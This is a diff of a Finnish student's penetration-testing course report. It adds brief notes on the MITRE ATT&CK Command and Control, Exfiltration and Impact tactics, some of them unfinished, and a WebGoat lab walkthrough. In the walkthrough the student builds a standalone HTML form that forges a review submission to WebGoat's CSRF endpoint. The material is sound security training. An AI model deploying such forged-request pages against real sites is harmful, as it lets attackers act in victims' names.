@@ -228,9 +228,30 @@ Course page: https://terokarvinen.com/2021/penetration-testing-course-2022-sprin
 
     - Command and Control
 
+        Kommunikaatiovaihe. Hyökkääjä pyrkii muodostamaan kommunikaatiokanavat kohdejärjestelmään ja mahdollisesti naamiomaan kommunikaatioon käytettävän datan.  
+
+        Lähde:  
+        https://attack.mitre.org/tactics/TA0011/
+
+        + Technique:
+
     - Exfiltration
 
-    - Impact  
+        Yritetään varastaa data, joka hyökkäyksen aikana on kerätty esimerkiksi käyttämällä muodostettua Command and Control kanavaa.  
+
+        Lähde:  
+        https://attack.mitre.org/tactics/TA0010/
+
+        + 
+
+    - Impact
+
+        Datan manipulointiin, häirintään tai tuhoamiseen keskittyvä vaihe.
+
+        Lähde:  
+        https://attack.mitre.org/tactics/TA0040/
+
+        + Technique: 
 
 * 
 
@@ -386,15 +407,21 @@ Tee ja raportoi
             success	false
             message	"Appears the request came from the original host"
 
-        Tässä vaiheessa minulle iski pieni hämmennys ja en hetkeen tiennyt, mitä tekisin. Avasin kuitenkin Developer Toolsit ja katselin tarkemmin lomakkeen (painikkeen) tietoja:  
+        Tässä vaiheessa minulle iski pieni hämmennys ja en hetkeen tiennyt, mitä tekisin. Avasin kuitenkin Developer Toolsit ja katselin tarkemmin lomakkeen (painikkeen) tietoja.  
 
-        ```        
-        Tähän koodia, VBoxin copypasta meni jostain syystä rikki enkä voi nyt buutata virtuaalikonettani**  
-        ```
-
-        Loin itsellen uuden .html tiedoston johon laitoin ainoastaan tuon lomakkeen tiedot ja poistin csrf -kentästä 'hidden' arvon:  
+        Loin itsellen uuden .html tiedoston johon laitoin ainoastaan tuon lomakkeen tiedot, muutin lomakkeen toiminnon kohteen relative linkistä palvelimen osoitteeksi, ja poistin csrf -kentästä 'hidden' arvon:  
         ``` 
-        **Tähän lisää koodia**
+        <!DOCTYPE html>
+        <html>
+            <body>
+                <form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="http://192.168.56.7:8080/WebGoat/csrf/review">
+                    <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
+                    <input class="form-control" id="reviewStars" name="stars" type="text">
+                    <input name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+                    <input type="submit" name="submit" value="Submit review">
+                </form>
+        </body>
+        </html>
         ``` 
 
         Avasin uuden luomani sivun selaimeen ja klikkkasin linkkiä:  
